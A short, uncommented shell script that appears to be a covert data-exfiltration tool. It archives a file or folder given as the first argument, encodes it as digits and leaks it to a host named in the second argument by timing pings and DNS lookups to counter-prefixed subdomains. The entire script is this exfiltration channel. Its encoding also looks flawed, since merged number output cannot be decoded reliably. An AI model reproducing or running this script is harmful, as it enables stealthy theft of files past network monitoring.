#!/bin/sh
tar -czf data.tar.gz $1 
data=`cat data.tar.gz | base64 | od -A n -t dI | sed 's/ *//g' | tr -d '\n' | sed 's/^ *//g'`
rm data.tar.gz

i=1
while [ $i -le ${#data} ]
do
   char=$(expr substr "$data" $i 2)
   ping -c 1 "$i.$2" &
   sleep "${char}"
   i=$(expr $i + 2)
done
